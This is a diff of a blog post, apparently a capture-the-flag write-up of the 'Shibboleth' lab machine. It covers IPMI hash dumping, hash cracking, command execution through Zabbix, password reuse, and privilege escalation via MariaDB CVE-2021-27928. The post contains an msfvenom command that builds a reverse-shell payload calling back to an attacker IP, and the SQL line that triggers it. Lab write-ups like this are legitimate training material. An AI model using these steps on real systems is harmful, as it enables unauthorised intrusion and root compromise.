@@ -52,12 +52,14 @@ Based on the Apache/2.4.41 version, the host is likely running Ubuntu Focal (20.
 
 Manually browsing to shibboleth.htb we see what seems like a default bootstrap website template.
 
+![default bootstrap website template](/assets/img/shibboleth/default bootstrap.png)
 
 #### Tech Stack
 The response headers don’t give much info at all.
 
 But the footer provides some interesting information that we need to take note of
 
+![Footer](/assets/img/shibboleth/footer.png)
 
 ### Directory Brute Force
 
@@ -122,125 +124,158 @@ We get:
 - `monitoring.shibboleth.htb`
 - `zabbix.shibboleth.htb`
 
+#### Site
 I will add all three to the hosts file and visit the pages.
 
 All three `subdomains` redirect to the same login page
 
 ![zabbix login page](/assets/img/shibboleth/zabbix_login_page.png)
 
-##### What is Zabbix you ask :)?
+### Zabbix
 
 Zabbix is an open-source, real-time monitoring tool for servers, networks and virtual machines and cloud services, which can be configured by using XML based templates.
 
 I tested all the default password and weak credentials but none worked.
 
-### UDP Port 623
+#### UDP Port 623
 A little research reminded me I never checked for any UDP ports open. Lets do just that.
 
 Bingo! port 623 is open.
 
+![UDP Port 623](/assets/img/shibboleth/623.png)
 
 I found out ASF stands for Alert Standart Format, which is a DMTF standard for remote monitoring, management and control of computer systems.
 
 
 Further research pointed me to Metasploit Framework's ipmi_version module which identifies a local BMC that supports IPMI version 2.0.
 
-
+![IPMIV2](/assets/img/shibboleth/ipimiv2.png)
 
  According to this Rapid7 Blog Post We can also be able to dump the hashes of valid accounts using the Metasploit module ipmi_dumphashes.
+
 Lets fire it up
 
-
+![Admin hash](/assets/img/shibboleth/adminhash.png)
 
 And we get a hash. We will copy the hash and save it in a file called hashes and attempt to crack it with hashcat.
 
 Hashcat new version can actually identify the hash type without having to provide the mode as seen below
 
+![identifying hash](/assets/img/shibboleth/identifyinghash.png)
 
+Hashcat cracked the hash in no time.
 
- Hashcat cracked the hash in no time.
+![Cracked Hash](/assets/img/shibboleth/cracked has.png)
 
 Our administrator really loves pumpkin pie 😎😎
 
 Now we have a valid username:password, we can try log in to Zabbix
 
-
+![try using the credentials](/assets/img/shibboleth/tryusing the credentials.png)
 
 We get redirected to Zabbix dashboard, sweet!
+
+![And We login](/assets/img/shibboleth/andwelogin.png)
 
 
 ## Shell as Zabbix
 #### Exploiting Zabbix
 I now have to find a way to execute commands on zabbix agents.
 
-Luckily i stumbled upon this Post .
+Luckily i stumbled upon this [Post](https://stackoverflow.com/questions/24222086/how-to-run-command-on-zabbix-agents){:target="_blank"}.
 
 We have to create a new item. Insert a command to spawn a reverse shell in the "Key" field. But before we get the revers shell, i have to test if we actually have RCE.
 
 We shall do this by initiating a ping command back to our box. (always a good move :) )
 
-### Testing RCE
+#### Testing RCE
 
+![Testing RCE](/assets/img/shibboleth/testing rce.png)
 
-### RCE confirmed
+#### RCE confirmed
 
+![Command execution](/assets/img/shibboleth/commandexecution.png)
 
 About time we get our shell
 
+![Getting a foothold on the box](/assets/img/shibboleth/getting a foothold on the box.png)
 
 Finally we are on the box as Zabbix user
 
+![Access as Zabbix](/assets/img/shibboleth/access as zabbix.png)
+## Shell as ipmi-svc
+There’s a single home directory on Shibboleth `ipmi-svc` which contains the `user falg` but Zabbix user cannot access it.
 
-### User Flag
+```
+zabbix@shibboleth:/home/ipmi-svc$ cat user.txt
+cat: user.txt: Permission denied
+```
+
 To obtain the user flag we need to operate as ipmi-svc user.
 
+```lua
 zabbix@shibboleth:/$ cat /etc/passwd | grep bash
 root:x:0:0:root:/root:/bin/bash
 ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash
+```
+### Password reuse
+
 Lets see if our "pumpkin pie loving" admin reused their password.
 
+```lua
 zabbix@shibboleth:/$ su ipmi-svc
 Password:
 ipmi-svc@shibboleth:/$
 ipmi-svc@shibboleth:/$ whoami
 ipmi-svc
+```
 Sure enough they did and we are ipmi-svc user. We can also read the user flag.
 
+![User Flag](/assets/img/shibboleth/userflag.png)
 
 ## Shell as root
-#### Enumeration
-Running processes
+### Enumeration
+#### MySQL
+
 Checking at the running processes we can see there is mysql running.
 
-Lets see if we can get the credentials from Zabbix config file.
+I will check and see if I can get the credentials from Zabbix config file which resides in `/etc/zabbix`. The file is quite large and most of it contains default values and so many commented out.
 
+![DB Password](/assets/img/shibboleth/dbpassword.png)
 
 Awesome! lets log in to the mysql service
 
+![MYSQL DB Version](/assets/img/shibboleth/msqldb version.png)
+
+### CVE-2021-27928
+#### Indentify
+
+Looking at the MariaDB version online I find a Vulnerability (CVE-2021-27928) associated with it.
+
+To take advantage of this vulnerability, I will need to create a shared object file (a type of DLL specifically for Linux systems) using the msfvenom tool and transfer the payload file to the target machine via wget as described in this [PoC](https://github.com/Al1ex/CVE-2021-27928){:target="_blank"}.
 
 
-### Exploiting MariaDB
-Checking the MariaDB version online I find a Vulnerability.
-
-Let's Create a reverse shell binary with the using msfvenom and transfer the payload file to the target machine via wget as described in the PoC.
-
+```json
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.20 LPORT=9003 -f elf-so -o george.so
-
-
+```
+![exploiting mariadb](/assets/img/shibboleth/exploiting mariadb.png)
 
 Now we spin up a netcat session and wait for a connection.
 
+![NC Session](/assets/img/shibboleth/ncsession.png)
 
 #### Execute:
 
+```lua
 SET GLOBAL wsrep_provider="/tmp/george.so";
+```
 
 in the MariaDB server to trigger the payload.
 
-
+![exploiting mariadb](/assets/img/shibboleth/exploitmariadb.png)
 
 Eureka!! We have root access.
 
+![And we are root](/assets/img/shibboleth/and we are root.png)
 
-
-****** And that was fun!!. Thank you for taking time to read my blog ************
+********* And that was fun!!. Thank you for taking time to read my blog ************
